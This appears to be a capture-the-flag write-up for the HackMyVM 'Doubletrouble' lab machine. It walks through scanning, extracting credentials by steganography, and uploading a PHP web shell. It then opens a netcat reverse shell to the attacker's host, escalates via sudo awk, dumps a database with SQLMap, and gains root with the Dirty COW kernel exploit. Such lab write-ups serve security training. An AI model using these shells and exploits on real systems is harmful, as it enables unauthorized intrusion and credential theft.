---
title: "Doubletrouble - HackMyVM"
summary: "Difficulty: Easy 🟢"
---

<style>

h6 {
  text-align: center;
  font-style: italic;
  font-weight: normal;
  position: relative;
  top: -10px;
}

img {
    display: flex !important;
    margin: 0 auto !important;
    justify-content: center !important;
    border-radius: 14px;
    border: 2px solid #4a90e2;
    box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
    transition: box-shadow 0.3s ease, transform 0.3s ease;
}
img:hover {
    box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
    transform: scale(1.03);
}

</style>

[Machine Link](https://hackmyvm.eu/machines/machine.php?vm=Doubletrouble)


To begin, we use the **arp-scan** tool to identify devices on our network and find a **MAC address** starting with **08:**, which is commonly associated with virtual machines.

```bash
sudo arp-scan -I eth0 --localnet
```

And we find the **IP** of the victim machine: **192.168.18.191**.

Now it’s time for **open port** scan, for which we will use **Nmap**. First, we run a **quick scan** of **all ports** on the target machine with the following command:

```bash
sudo nmap -sS -p- --min-rate 4500 -n -Pn 192.168.18.191
```

![1](/images/writeups/doubletrouble/1.png)

Once we identify the **open ports**, we perform a more **detailed scan** on those specific ports:

```bash
nmap -sCV -p22,80 -n -Pn 192.168.18.191 -oN target
```

![2](/images/writeups/doubletrouble/2.png)

When we visit the hosted website, we see a **login page**, just like the **Nmap** scan showed.

![3](/images/writeups/doubletrouble/3.png)

We will perform **directory enumeration** with [**Gobuster**](https://github.com/OJ/gobuster) to identify any directories that might help us.

```bash
gobuster dir -u http://192.168.18.191/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

We find the following directory, which will be useful since the others don’t contain anything significant

![4](/images/writeups/doubletrouble/4.png)

Inside the ***/secret*** directory, there is an image, so I decide to download it and apply **steganography techniques** to see if there is any **hidden information** in the image.

![5](/images/writeups/doubletrouble/5.png)

```bash
wget http://192.168.18.191/secret/doubletrouble.jpg
```

We are going to use **Stegseek**.

![6](/images/writeups/doubletrouble/6.png)
<h6>Using Stegseek</h6>

Inside this, you will find the login credentials.

![7](/images/writeups/doubletrouble/7.png)

So, we log in through the page we saw earlier using the obtained credentials.

![8](/images/writeups/doubletrouble/8.png)

![9](/images/writeups/doubletrouble/9.png)

Now that we are inside, let's upload a **malicious PHP file** to execute commands. I am going to upload it as the user's profile picture.

![10](/images/writeups/doubletrouble/10.png)
<h6>We upload the malicious PHP</h6>

The code:

```php
<?php
		echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

![11](/images/writeups/doubletrouble/11.png)
<h6>Malicious PHP</h6>

We upload it and navigate to the ***/uploads*** directory we found earlier while enumerating directories with **Gobuster**. Then, we access the users folder, where we will find our **PHP file**.

![12](/images/writeups/doubletrouble/12.png)

And now, we can execute commands.

![13](/images/writeups/doubletrouble/13.png)
<h6>We execute the command 'id'</h6>

So, we are going to perform a **Reverse Shell** to gain access to the machine. To do this, we set up a listener on **port 4444** with netcat.

```bash
nc -lvnp 4444
```

And then we execute this code on the website:

```bash
nc -c bash 192.168.18.100 4444
```

![14](/images/writeups/doubletrouble/14.png)


By checking the **sudo permissions**, we see that the **awk binary** can be executed as **root**.

![15](/images/writeups/doubletrouble/15.png)
<h6>Sudo permissions</h6>

The [**GTFObins**](https://gtfobins.github.io/) page shows how to exploit these permissions.

![16](/images/writeups/doubletrouble/16.png)

![17](/images/writeups/doubletrouble/17.png)
<h6>Code we need to execute</h6>

Now, we execute the command:

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```

![18](/images/writeups/doubletrouble/18.png)
<h6>A new machine</h6>

We are not done yet. Although we have **root** access, we can’t find any flags. Instead, we discover another machine with the same name inside this one, so we need to **download** it.

---- 
**Victim machine:**

```bash
python3 -m http.server 8080
```
----
**Our real machine:**

Since I am using **Windows 10**, I will use the following command to download it from **PowerShell**:

```bash
Invoke-WebRequest -Uri "http://192.168.18.191:8080/doubletrouble.ova" -OutFile "newmachine.ova"
```
----

Now, we start the machine and find its **IP address** using **arp-scan**. In this case, the **IP** of the second machine is **192.168.18.193**. 

So, I perform another port scan with **NMAP**.

![19](/images/writeups/doubletrouble/19.png)

Another login page:

![20](/images/writeups/doubletrouble/20.png)

Now, we will use [**Burp Suite**](https://portswigger.net/burp/communitydownload) to intercept data, and then use [**SQLMap**](https://github.com/sqlmapproject/sqlmap) to check if the login page is vulnerable to **SQL Injection** (**SQLI**).

![21](/images/writeups/doubletrouble/21.png)

We copy all this content and paste it into a file, which I will name ***sqlmap.txt***. Now, we run **SQLMap** using this file.

```bash
sqlmap -r sqlmap.txt
```

And we observe that it is indeed **vulnerable**. Next, we will execute the following command to show us the existing **databases**.

```bash
sqlmap -r sqlmap.txt -dbs
```

![22](/images/writeups/doubletrouble/22.png)
<h6>'Doubletrouble' database</h6>

Now that we have found the **doubletrouble database**, we dump its contents.

```bash
sqlmap -r sqlmap.txt -D doubletrouble --dump
```

![23](/images/writeups/doubletrouble/23.png)
<h6>Users and passwords</h6>

We found two **usernames** and **passwords**. The first one didn’t work, but **clapton** worked for **SSH**.

![24](/images/writeups/doubletrouble/24.png)

And finally, we obtain the **user flag**.

![25](/images/writeups/doubletrouble/25.png)

## Privilege escalation to Root

We observe that the machine's version is **vulnerable** to a **Local Privilege Escalation**.

![26](/images/writeups/doubletrouble/26.png)
<h6>Vulnerable kernel version</h6>

![27](/images/writeups/doubletrouble/27.png)

And we download it, following the steps it indicates.

```bash
mv 40839.c dirty.c
```

And now we transfer it to the victim machine using **netcat**.

----
**Victim machine:**

```bash
nc -lvnp 8888 > dirty.c
```

----
**Local machine:**

```bash
nc 192.168.18.193 8888 < dirty.c
```

----

And now we compile it.

```bash
gcc -pthread dirty.c -o dirty -lcrypt
```

So, we run it, providing the password we want. In my case, it will be '**hello**'.

```bash
./dirty my-new-password
```

Then we become the **root** user, now named **firefart**.

```bash
su firefart
```

And we enter the **password** we assigned earlier. 

Now that we have **root** access, we can proceed to obtain the **root flag**.

![28](/images/writeups/doubletrouble/28.png)

Machine completed!